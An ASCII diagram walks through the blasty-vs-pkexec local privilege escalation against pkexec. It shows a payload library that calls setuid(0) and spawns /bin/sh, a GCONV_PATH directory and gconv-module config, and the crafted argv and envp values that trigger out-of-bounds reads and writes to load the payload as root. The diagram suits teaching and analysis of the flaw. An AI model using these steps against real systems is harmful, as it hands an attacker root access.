 the blasty-vs-pkexec.c exploit                   ./payload
┌─────────────────────────────────────┐           ┌────────────────────────────────────────────┐
│                                     │           │  setuid(0); seteuid(0); ...                │
│ 1.build malicious shared    ────────┼────────►  │  execve("/bin/sh",...                      ◄───┐
│   library `payload`                 │           │                                            │   │
│                                     │           └────────────────────────────────────────────┘   │
│                                     │                                                            │
│                                     │           .                                                │
│ 2.create                    ────────┼────────►  ─┬────────────────────────────────────────────   │
│   `GCONV_PATH=./lol` file           │            │-GCONV_PATH=.                                  │
│                                     │    ┌──────►  |- lol                                        │
│                                     │    │                                                       │
│                                     │    │                                                       │
│                                     │    │      ./lol/gconv-module                               │
│ 3.create malicious          ────────┼────┼───► ┌──────────────────────────────────────────────┐  │
│   gconv-module config file          │    │     │module  UTF-8//    INTERNAL    ../payload    2◄──┼──┐
│                                     │    │     └────────────────────────────────────┬─────────┘  │  │
│                                     │    │                                          │            │  │
│                                     │    │                                          └────────────┘  │
│                                     │    │                                                          │
│                                     │    │      the victim pkexec                                   │
│ 4.execve("/usr/bin/pkexec", ────────┼────┼───► ┌─────────────────────────────────────────────────┐  │
│    argv={NULL},                     │    │     │ 1. out-of-bound read in line 610,               │  │
│    envp={"lol",                     │    │     │    got `path = "lol"`                           │  │
│          "PATH=GCONV_PATH=.",       │    │     │                                                 │  │
│          "LC_MESSAGE=en_US.UTF-8",  │    └─────┤ 2. `g_find_program_in_path(path)` in line 632   │  │
│          "XAUTHORTIY=../LOL",       │          │    Of course we found it.                       │  │
│          NULL})                     │          │                                                 │  │
│                                     │          │ 3. triggered out-of-bound write                 │  │
└─────────────────────────────────────┘          │      envp={"GCONV_PATH=./lol", ─────────┬───────┼──┘
                                                 │            "PATH=GCONV_PATH=.",         │       │
                                                 │            "LC_MESSAGE=en_US.UTF-8",    │       │
                                                 │            "XAUTHORITY=../LOL',         │       │
                                                 │            NULL})                       │       │
                                                 │                                         │       │
                                                 │ 4. triggered `g_printerr()` before `encclear()` │
                                                 │    via "XAUTHORITY" variable                    │
                                                 │                                                 │
                                                 └─────────────────────────────────────────────────┘